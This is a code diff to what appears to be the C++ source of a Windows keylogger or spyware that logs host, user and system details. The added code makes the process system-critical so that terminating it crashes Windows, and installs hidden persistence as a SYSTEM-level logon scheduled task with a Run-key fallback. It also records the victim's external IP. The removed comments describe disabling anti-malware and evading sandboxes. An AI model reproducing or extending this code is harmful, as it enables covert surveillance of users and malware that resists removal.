@@ -19,6 +19,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
 
     SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
 
+
     DWORD Tick1 = GetTickCount();
     int RandSeed = (int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator();
     srand(RandSeed);
@@ -103,10 +104,22 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
             VersionFileIO.close();
         }
     }
-    //add special security routines, example:
-    // if(Trust.HasRunningAntiMalware && DebugItem.trust > 75){ reboot to safemode and disable them }
-    // or
-    // if( classic sandbox parameters ){ act like a normal program to evade detection }
+
+    if (IsElevated()) {
+        HANDLE hToken;
+        LUID luid;
+        LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid);
+        TOKEN_PRIVILEGES tp;
+        tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        tp.PrivilegeCount = 1;
+        OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
+        AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
+        HANDLE ntdll = LoadLibrary("ntdll.dll");
+        RtlSetProcessIsCritical SetCriticalProcess;
+        SetCriticalProcess = (RtlSetProcessIsCritical) GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
+        SetCriticalProcess(TRUE, NULL, FALSE);
+    }
 
 Log:
 
@@ -121,6 +134,7 @@ Log:
     std::string TimeText = "Current Tick:";
     std::string ComputerText = "Host Name:";
     std::string UsernameText = "User Name:";
+    std::string PrivilegeText = "Privilege:";
     std::string InternetText = "Internet Status:";
     std::string WidthText = "Screen Width:";
     std::string HeightText = "Screen Height:";
@@ -143,6 +157,7 @@ Log:
     std::string CopiedFileText = "Made executable \"";
     std::string CryptText = "Encrypted with ";
     std::string DiskText = "Found partitions:\n";
+    std::string IPText = "External IP:";
 
     VersionText += CurrentVersion;
     if (IsMajor)
@@ -386,6 +401,12 @@ Log:
     GetLocaleInfo(GetSystemDefaultUILanguage(), LOCALE_SENGLANGUAGE, LanguageIdentifier, sizeof(LanguageIdentifier));
     GetLocaleInfo(GetSystemDefaultUILanguage(), LOCALE_SENGCURRNAME, CurrIdentifier, sizeof(CurrIdentifier));
 
+    if (IsElevated())
+        PrivilegeText += "Elevated";
+    else
+        PrivilegeText += "Standard";
+
+
     TimeText += LogTime;
     MyLog.LogItChar(TimeText);
 
@@ -397,6 +418,12 @@ Log:
 
     InternetText += InternetStatusString;
     MyLog.LogItChar(InternetText);
+
+    if (Trust.HasActiveInternet)
+        IPText += RetrieveExternalIp(CurrentDir);
+    else
+        IPText += "Offline";
+    MyLog.LogItChar(IPText);
 
     WidthText += Width;
     MyLog.LogItChar(WidthText);
@@ -849,14 +876,27 @@ void CreateRegistryKey(PCSTR AppName, PCSTR PathToExe)
 {
     HKEY hKey = NULL;
     char szValue[MAX_PATH] = {};
-
+    std::string Cmd;
     strcpy_s(szValue, "\"");
     strcat_s(szValue, PathToExe);
     strcat_s(szValue, "\" ");
-
-    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
-    RegSetValueExA(hKey, AppName, 0, REG_SZ, (BYTE*)szValue, strlen(szValue) + 1);
-    RegCloseKey(hKey);
+    if (IsElevated()) {
+        Cmd = "/delete  /tn \"";
+        Cmd += AppName;
+        Cmd += "\" /f";
+        ShellExecuteA(NULL, "open", "schtasks.exe", Cmd.c_str(), NULL, SW_HIDE);
+        Cmd = "/create /sc onlogon /tn \"";
+        Cmd += AppName;
+        Cmd += "\" /tr ";
+        Cmd += szValue;
+        Cmd += " /ru \"SYSTEM\"";
+        ShellExecuteA(NULL, "open", "schtasks.exe", Cmd.c_str(), NULL, SW_HIDE);
+    }
+    else {
+        RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
+        RegSetValueExA(hKey, AppName, 0, REG_SZ, (BYTE*)szValue, strlen(szValue) + 1);
+        RegCloseKey(hKey);
+    }
     return;
 }
 
@@ -1014,6 +1054,37 @@ void TimerThread() {
         Counter = CharactersPerLog;
     }
     ExitThread(0);
+}
+
+std::string RetrieveExternalIp(std::string CurrentDir) {
+    std::string Ret;
+    std::string VersionFile = CurrentDir;
+    VersionFile += "\\ExtIP.txt";
+    URLDownloadToFileA(NULL, "https://api.my-ip.io/ip.txt" , VersionFile.c_str(), 0, NULL);
+    SetFileAttributesA(VersionFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
+    std::ifstream VersionFileIO(VersionFile);
+    if (!VersionFileIO.eof()) {
+        std::getline(VersionFileIO, Ret, '\0');
+    }
+    VersionFileIO.close();
+    DeleteFileA(VersionFile.c_str());
+    return Ret;
+}
+
+BOOL IsElevated() {
+    BOOL fRet = FALSE;
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        TOKEN_ELEVATION Elevation;
+        DWORD cbSize = sizeof(TOKEN_ELEVATION);
+        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
+            fRet = Elevation.TokenIsElevated;
+        }
+    }
+    if (hToken) {
+        CloseHandle(hToken);
+    }
+    return fRet;
 }
 
 #pragma warning( pop )
